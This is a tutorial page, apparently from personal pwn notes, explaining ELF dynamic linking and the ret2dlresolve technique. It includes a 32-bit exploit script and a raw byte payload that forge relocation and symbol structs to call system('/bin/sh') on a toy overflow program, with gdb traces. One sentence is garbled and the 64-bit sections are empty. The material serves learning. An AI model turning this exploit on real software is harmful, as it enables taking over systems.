# Ret2dlResolve

Ret2dlresolve is a technique used in binary exploitation to exploit vulnerable programs by manipulating dynamic linker and resolver functions, allowing an attacker to execute arbitrary code or gain control of a compromised system. 

It allow attackers to resolve and call functions from shared libraries even in the presence of stack canaries or non-executable memory protections.

:warning: This bypass is not effectiv if RELRO is fully enable because that prevents modifications to the Global Offset Table (GOT) and the Procedure Linkage Table (PLT), making it difficult to manipulate function pointers.

### Table of Content

- [Context and Theory](#context-and-theory)
	- [Compile a Program without libraries](#compiled-a-program-without-libraries)
	- [Compile a Program with libraries](#compile-a-program-with-libraries)
		- [Statically link](#static-libraries)
		- [Dynamically link](#dynamic-linking)
          - [Plt and Got](#plt-and-got-sections)
  - [How the exploit Work](#how-the-exploit-work)
    - [JMPREL (.rel.plt)](#jmprel-relplt)
    - [DynSym](#dynsym)
    - [DynStr](#dynstr)
    - [_dl_runtime_resolve function](#_dl_runtime_resolve-function)
- [Exploit](#exploit)
  - [32 bit](#32-bit)
    - [no RELRO](#no-relro)
    - [Partial RELRO](#partial-relro)
  - [64 bit]()
    - [Partial RELRO]()
- [Documentation](#documentation)


## Context and theory

### Compiled a Program without libraries

Lets say we have two file main.c and foo.c.

![function](/pwn/img/function.png)

**Symbol** resolution is defined as find a single definition for each symbol and **Relocation** is defined as update each reference to a symbol with the runtime address of the definition.

To create an executable it merge the sections from mutiple object files together and update symbol reference.

![relocation](/pwn/img/relocation.png)

```bash
$> gcc -c main.c foo.c
```

First on main.o, f() is defined on symbol table but call undefined and the program will fix it: 

```bash
$> objdump main.o -tTrR

SYMBOL TABLE:
0000000000000000 l    df *ABS*	0000000000000000 main.c
0000000000000000 l    d  .text	0000000000000000 .text
0000000000000000 g     F .text	0000000000000014 main
0000000000000000         *UND*	0000000000000000 f
```

We can print the things that compiler need to do to create the executable. This things are stored in the **.rela** section.

```bash
$> readelf -r main.o 

Relocation section '.rela.text' at offset 0x160 contains 1 entry:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000000009  000400000004 R_X86_64_PLT32    0000000000000000 f - 4
```

As we can see here, the f() symbol need to be fix.

```bash
# Another way to see the call to f() undefined
$> objdump main.o -dx

0000000000000000 <main>:
   0:	f3 0f 1e fa          	endbr64 
   4:	55                   	push   %rbp
   5:	48 89 e5             	mov    %rsp,%rbp
   8:	e8 00 00 00 00       	call   d <main+0xd>
			9: R_X86_64_PLT32	f-0x4
   d:	b8 00 00 00 00       	mov    $0x0,%eax
  12:	5d                   	pop    %rbp
  13:	c3                   	ret    
```

Address of f() isn't defined `e8 00 00 00 00`.

Now lets print the a.out:

```bash
# call is fix now !
$> objdump a.out -dx

0000000000001129 <main>:
    1129:	f3 0f 1e fa          	endbr64 
    112d:	55                   	push   %rbp
    112e:	48 89 e5             	mov    %rsp,%rbp
    1131:	e8 07 00 00 00       	call   113d <f>
    1136:	b8 00 00 00 00       	mov    $0x0,%eax
    113b:	5d                   	pop    %rbp
    113c:	c3                   	ret    
```

### Compile a Program with libraries

In addition with every thing we saw earlier, libraries are often used in programs. This libraries can be add statically or dynamically.

- *build time* : gcc main.c
- *load / run time* : ./a.out

### Static Libraries

Static libraries are link at *build time* (opposit of at *run time* (during the execution)).

```c
#include <stdio.h>

int main(void) {
    printf("test");
}
```

```bash
$> gcc -c main.c -static
$> readelf -r main.o

Relocation section '.rela.text' at offset 0x198 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
00000000000b  000300000002 R_X86_64_PC32     0000000000000000 .rodata - 4
000000000018  000500000004 R_X86_64_PLT32    0000000000000000 printf - 4
```

As we can see, `.rodata` and `printf` need to be resolve.

```bash
$> gcc main.o -static
$> objdump a.out -dx

0000000000401745 <main>:
  401745:       f3 0f 1e fa             endbr64 
  401749:       55                      push   %rbp
  40174a:       48 89 e5                mov    %rsp,%rbp
  40174d:       48 8d 05 b0 68 09 00    lea    0x968b0(%rip),%rax        # 498004 <_IO_stdin_used+0x4>
  401754:       48 89 c7                mov    %rax,%rdi
  401757:       b8 00 00 00 00          mov    $0x0,%eax
  40175c:       e8 2f 9e 00 00          call   40b590 <_IO_printf>
  401761:       b8 00 00 00 00          mov    $0x0,%eax
  401766:       5d                      pop    %rbp
  401767:       c3                      ret    
  401768:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
  40176f:       00
```

Compiler add printf at the .text section.

The problem is the size of the executable. Static link load every function used in the program inside the executable increasing the size of it.

```bash
$> gcc main.c -static | ls -lh
total 892K
-rwxrwxr-x 1 gottie gottie 880K sept. 11 12:18 a.out
$> gcc main.c | ls -lh
total 28K
-rwxrwxr-x 1 gottie gottie  16K sept. 11 12:19 a.out
```

880k against 16k for the dynamic linking.

### Dynamic linking

libraries are load at run time:

![shared-libraries](/pwn/img/shared.png)

**Shared libraries**: 

- are an executables that can be linked with the library at load time
- create a .interp section with the location of the dynamic linker

**When the program is compile :**

- Build time(`gcc main.c`)
  - libraries relocations and symbols tables info are load into the executable
- Load time(`./a.out`)
  - loader checks for .interp section
  - loader runs the dynamic linker
  - dynamic linker:
    - relocates the text and data sections of the shared libraries into memory
    - relocates references to any symbols referenced in shared libraries

![schema of dl](/pwn/img/creation-of-dl.png)

Lets dive into how it work presicely:

### Plt and Got sections:

PLT (procedure linkage Table) contain code to help with runtime linkage.

GOT (global offset table) contain informations on variables and functions.

For every PLT entry (plt.sec) you have a corresponding GOT entry.

Every time you call an extern function, the programm call the plt.sec of the corresponding function:


```py
Disassembly of section .plt.sec:

0000000000401050 <printf@plt>:
  401050 <+0>:    jmpq    *0x200c22(%rip)   # 0x601018
  401056 <+6>:    pushq   $0x0
  40105b <+11>:	  jmpq    0x4003e0
```

First call to printf:

- jmpq to 0x601018 point to the entry of printf in the GOT.
- but if we `print/x *(void**)0x601018` it print `0x401056`
- It mean The entry of GOT point back to the next instruction on the PLT.
- then push relog_arg/rel_offset to the stack
- Finaly call PLT[0] wich contain a pointer to the dinamic linker.
- The dl will resolve 0x601018 pointing now to printf().
- Then it call printf().

Second Call of printf:

- jmpq to 0x601018 point to the entry of printf in the GOT.
- Now 0x601018 print to prinf function so it is call throught the GOT.

### How The exploit Work

Elf file uses to relocation dynamically linked functions. It is the core of ret2dlresolve attack: _dl_runtime_resolve(link_map, reloc_offset).

Definition:

#### JMPREL (.rel.plt)

Stores a tables called Relocation table. Each entry maps to a symbol.

```c
typedef uint32_t Elf32_Addr; 
typedef uint32_t Elf32_Word; 
typedef struct{
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
} Elf32_Rel;
 
#define ELF32_R_SYM(val) ((val) >> 8) 
#define ELF32_R_TYPE(val) ((val) & 0xff)
```

The type of these entries is Elf32_Rel, which is defined as it follows. The size of one entry is 8 bytes.

The ELF32_R_SYM(r_info) == 1 variable gives the index of the Elf32_Sym in SYMTAB for the specified symbol

```bash
$> readelf -r a.out
Relocation section '.rela.plt' at offset 0x548 contains 1 entrie:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
```

Let’s take a look at our table:

  - The column Name gives the name of our symbol: read@GLIBC_2.0;
  - Offset is the address of the GOT entry for the symbol: 0x0804a00c;
  - Info stores additional metadata such as ELF32_R_SYM or ELF32_R_TYPE;

According to the defined MACROS, `ELF32_R_SYM(r_info) == 1` and `ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)`. 

:warning: When the dynamic linker resolve the functon's address it overwrite the GOT entry and the .rel.plt.

#### DynSym

This table holds relevant symbol information. Each entry is a Elf32_Sym structure and its size is 16 bytes.

```c
typedef struct { 
   Elf32_Word st_name ; /* Symbol name (string tbl offset) -4b*/
   Elf32_Addr st_value ; /* Symbol value -4b*/ 
   Elf32_Word st_size ; /* Symbol size -4b*/ 
   unsigned char st_info ; /* Symbol type and binding-1b */ 
   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 -1b */ 
   Elf32_Section st_shndx ; /* Section index -2b*/ 
} Elf32_Sym;
```

#### DynStr

.dynstr: (dynamic string) store string associated with .dynsym.

```bash
0x804822C ; ELF String Table
0x804822C byte_804822C    db 0
0x804822D aLibcSo6        db 'libc.so.6',0
0x8048237 aIoStdinUsed    db '_IO_stdin_used',0
0x8048246 aRead           db 'read',0
0x804824B aAlarm          db 'alarm',0
0x8048251 aLibcStartMain  db '__libc_start_main',0
0x8048263 aGmonStart      db '__gmon_start__',0
0x8048272 aGlibc20        db 'GLIBC_2.0',0
```

#### _dl_runtime_resolve Function

When the program call a exertnal function first, it resolve is address by calling the _dl_runtime_resolve.

You can see it at plt[0] which is the function which set up and call the resolver:

```py
pwndbg> x/2i 0x80482f0 # plt default stub
0x80482f0:  push  DWORD PTR ds:0x804a004 # push link_map
0x80482f6:  jmp   DWORD PTR ds:0x804a008 # jmp _dl_runtime_resolve
pwndbg> x/wx 0x804a008
0x804a008:  0xf7fe7b10 # _dl_runtime_resolve
```

Two things are done before calling the resolver:

- push the reloc offset (relog_arg /rel_offset) on the stack

The rel_offset is the distance between the .rel.plt and the entry of the function to resolve.

- push link_map (read@got) it help write the address after the resolution.

Pseudo code of _dl_runtime_resolve:

```c
// call of unresolved read(0, buf, 0x100)
_dl_runtime_resolve(link_map, rel_offset) {
    Elf32_Rel * rel_entry = JMPREL + rel_offset ;
    Elf32_Sym * sym_entry = &SYMTAB[ELF32_R_SYM(rel_entry->r_info)];
    char * sym_name = STRTAB + sym_entry->st_name ;
    _search_for_symbol_(link_map, sym_name);
    // invoke initial read call now that symbol is resolved
    read(0, buf, 0x100);
}
```

There is **3** ways to exploit it:

#### Direct control over the content of the .rel.plt items

- overwrite the .rel.lf32_sym to STRTAB gives the addreplt with the address of system(), when the dl is call, he know the resolution as been done and can call it.

#### Indirecty control the content of the .rel.plt items

- overwrite a function name inside the .dynstr to write the system() function.
- call the dynamic linker:
  - it resolve the address of the function by looking at it name in the .dynstr and call it

#### Forge link-map

The idea is to crate a fake link_map struct use by the dl for resolve symbols. If we can control it, we can influence dl to resolve the function that we want.

## Exploit

- [RELRO](/pwn/security-of-binaries.md#relro)

### 32 bit

#### No RELRO

#### Partial RELRO

Vuln code with control eip at 28:

```c
int main(void)
{
  char buffer[24];
  read(0, buffer, 0x64);
  return ;
}
```

Follow the [payload](/pwn/payload/payload_ret2dlresolve_32bit_partialRELRO.py).

Shema of the exploit : 

```py
_dl_runtime_resolve(link_map, rel_offset)
                                       +
          +-----------+                |
          | Elf32_Rel | <--------------+
          +-----------+
     +--+ | r_offset  |        +-----------+
     |    |  r_info   | +----> | Elf32_Sym |
     |    +-----------+        +-----------+      +----------+
     |      .rel.plt           |  st_name  | +--> | system\0 |
     |                         |           |      +----------+
     v                         +-----------+        .dynstr
+----+-----+                      .dynsym
| <system> |
+----------+
  .got.plt
```

```py
# get section address
BSS    = elf.get_section_by_name('.bss').header['sh_addr']
PLT    = elf.get_section_by_name('.plt').header['sh_addr'] #dl = plt[0]
STRTAB = elf.get_section_by_name('.dynstr').header['sh_addr']
SYMTAB = elf.get_section_by_name('.dynsym').header['sh_addr']
JMPREL = elf.get_section_by_name('.rel.plt').header['sh_addr'] # rel.plt
# Gadget
GADGET_POP3RET = 0x080484b9 # pop esi, pop edi, pop ebp, ret
```


- Get section address, readable with the bash command `readelf` and find a gadget with [ROPgadget](/tools/RopGadget.md). We dont care in which register it pop the stack.

```py
reloc_offset = BSS - JMPREL # our fake offset to our fake rel.plt struct
```

- We gonna create a fake Elf32_Rel struct and fake Elf32_Sym struct to resolve the systeme function.

As i told you, when _dl_runtime_resolve is call, it take as argument the reloc arg, this reloc is use this way:  

```py
fake_Elf32_rel = JMPREL + reloc_offset
```

- We gonna write fake structs (Elf32_Rel and Elf32_Sym) in the BSS section because this section is fill with bunch of '\0' and is writable.

- So When the _dl_runtime_resolve is call, you want him to use our fake struct by passing him the good offset.

```py
binsh_addr = BSS + 12 + 16 + 8
```

- This is where "/bin/sh" will be stored in the BSS section, sizeof(Elf32_Rel) + sizeof(Elf32_Sym) + sizeof("system\0\0")

```py
stage1 = b'A' * OFFSET
# call read(stdin, bss, 0x64)
stage1 += p32(elf.plt["read"])  # read offset int the .plt section
stage1 += p32(GADGET_POP3RET)   # Pop read arg and ret to PLT[0] -> resolver
stage1 += p32(0)                # stdin
stage1 += p32(BSS)              # buffer
stage1 += p32(0x64)             # length
# call plt[0] = system("/bin/sh")
stage1 += p32(PLT)              # ret2PLT (call system function)
stage1 += p32(reloc_offset)     # JMPREL + reloc_offset points to BSS (fake Elf32_Rel struct)
stage1 += p32(0xdeadbeef)           # return pointer after resolution
stage1 += p32(binsh_addr)       # arg for system function
# print(''.join(['\\x{:02x}'.format(ord(byte)) for byte in stage1]))
p.send(stage1)
```

- overwrite eip with read()
- when the function gonna end, it will return to GADGET_POP3RET. This gadget will be use to clean the stack and call the next function. (clean read arg push on the stack).
- read args are push: 0, BSS address, 100 / 0x64: `read(0, BSS, 100);`
- We gonna see juste later what we write in the BSS buffer.
- So next idea is recal PLT[0] to trigger the _dl_runtime_resolve (remember the gadget will pop 3 times and ret to the next address on the stack (PLT[0])).
- _dl_runtime_resolve need arg push in the stack:
- reloc_offset allready calculed (at the start of BSS section).
- _dl_runtime_resolve will call the system function, at the end it return to the next address on the stack: `0xdeadbeaf`.
- Finally we need to pass to the system function the address of the "/bin/sh" strings calculed too. (at the end of the structs in BSS).

Stage 2 is about to write struct in the BSS section:

```py
#Fake Elf32_Rel
stage2 = p32(elf.got['read']) # after resolving symbol write the actual address of function
stage2 += p32(r_info)

```

Lets try understand what happend here:

```py
                      BSS
--------------------------------------------------
|                                                |
| Elf32_REl | Elf32_Sym | system\0\0 | /bin/sh\0 |
|    12           16         8                   |
--------------------------------------------------
```

Fake Elf32_Rel contain two things: 

```c
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
```

- r_offset is the address of a function in the GOT. For the vuln code uptheree we'll pass read@got.
- r_info is more complex: it store two things
  - index of the symbol
  - 07 at the end (type)

You can write r_info this way:

```py
dynsym_idx = ((BSS + (0x4 * 3)) - SYMTAB) // 0x10 # index to the Elf32_Sym which is store in BSS + 12
r_info = (dynsym_idx << 8) | 0x7
```

- The idx looks comlex but it is not: i sub Symtab to BSS + 12 to get the offset of the fack Elf32_sym.
- The _dl_runtime_resolve will find the symbol this way:

```c
Elf32_Sym fake_sym = (Elf32_Sym)SYMTAB[idx];
```

We divide by 0x10 because size of Sym is 16 (remember we want an index not the offset).

```py
stage2 += p32(0) #padding
#Fake Elf32_Sym
stage2 += p32(dynstr_offset)
stage2 += p32(0) * 3
#Strings
stage2 += b'system\x00\x00'
stage2 += b'/bin/sh\x00'
```

- In the fake Sym, only the first info will be use dynamic string offset.
- I had to padd the Sym to make it work well
- Dynstr_offset i used this way

```c
Symbol_name_to_resolve = STRTAB + offset.
```

- In our case, the string wont be located to strtab, but in bss, we need to give it the correct offset

```py
dynstr_offset = (BSS + (0x4 * 7)) - STRTAB
```

BSS + 0x4 * 7 points to the system string. So if you sub the address of STRTAB it give you the offset.

### POC:

One line command to help us debbuged with gdb: buffer1 + padding to fille the 100 read + buffer2.

```py
python3 -c 'import sys; sys.stdout.buffer.write(b"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xe0\x82\x04\x08\xb9\x84\x04\x08\x00\x00\x00\x00\x20\xa0\x04\x08\x64\x00\x00\x00\xd0\x82\x04\x08\x88\x1d\x00\x00\xef\xbe\xad\xde\x44\xa0\x04\x08" + b"A" * 36 + b"\x0c\xa0\x04\x08\x07\xe6\x01\x00\x00\x00\x00\x00\x20\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x73\x79\x73\x74\x65\x6d\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00")'
```

```py
b _dl_runtime_resolve
r < <(python3 -c '\x41\x41....')
c
c
x/4xw $esp
0xffffda80│+0x0000: 0xf7ffd940  →  0x00000000	 ← $esp
0xffffda84│+0x0004: 0x00001d88
0xffffda88│+0x0008: 0xdeadbeef
0xffffda8c│+0x000c: 0x0804a044  →  "/bin/sh"
```

Top of the stack before the exec of runtime_resolve.

- forge_link
- offset JMRPREL
- return pointer
- system arg

```py
[*] Section Headers
[*] BSS:         0x804a020
[*] PLT:         0x80482d0
[*] STRTAB:      0x804821c
[*] SYMTAB:      0x80481cc
[*] JMPREL:      0x8048298
[*] READ:        0x80482e0
```

```py
x/3xw 0x8048298 + 0x00001d88 #.rel.plt JMPREL 
0x804a020:	0x0804a00c	0x0001e607	0x00000000
```

It's our fake Elf32_Rel

- 0x0804a00c read@got
- 0x0001e607 index of sym in the symtable + type

```py
x/2xw 0x80481cc + (0x0001e6 * 16) #SYMTAB[1e6]
0x804a02c:	0x00001e20	0x00000000
```

It's our fake Elf32_Sym

- 0x00001e20 is the offset bettween the STRTAB and and the string to resolve

```py
x/2s 0x804821c + 0x00001e20
0x804a03c:	"system"
```

### Documentation

- [Amazing videos of Chris Kanich](https://www.youtube.com/watch?v=Ss2e6JauS0Y)
- [ret2 tuto: binary exploitation](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation)
- [ret2 tuto:tistory](https://wyv3rn.tistory.com/225#----%--return%--to%--dl-resolve)
- [ret2 tuto:hackmd.io](https://hackmd.io/@v13td0x/ret2dlresolve#x86)

---

[**:arrow_right_hook: Back PWN**](/pwn/pwn.md)